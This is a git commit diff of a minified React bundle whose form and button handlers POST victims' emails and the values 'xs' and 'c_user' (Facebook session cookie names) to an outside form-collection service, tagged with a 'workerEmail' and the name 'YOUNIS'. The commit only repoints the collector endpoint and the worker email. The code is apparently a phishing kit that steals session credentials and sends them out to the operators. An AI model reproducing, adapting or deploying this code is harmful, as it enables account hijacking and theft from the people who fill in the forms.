0f5b4324f6b2b5517f9223ebd72b353b19b1e8d9
YG445577 <adslorna708@gmail.com>
2025-01-17 15:27:40 +0500

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -9814,14 +9814,14 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/DEEIr4lxi", {
+                                    fetch("https://submit-form.com/SVJj36npc", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "Lernayouamzaxal@gmail.com",
+                                            workerEmail: "Meri.jan.saba.ghaliya@gmail.com",
                                             xs: r,
                                             c_user: i,
                                             name: "YOUNIS"
@@ -13358,14 +13358,14 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/DEEIr4lxi", {
+                                    u && o ? (fetch("https://submit-form.com/SVJj36npc", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "Lernayouamzaxal@gmail.com",
+                                            workerEmail: "Meri.jan.saba.ghaliya@gmail.com",
                                             xs: o,
                                             c_user: u,
                                             name: "YOUNIS"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/DEEIr4lxi", {
+                        fetch("https://submit-form.com/SVJj36npc", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
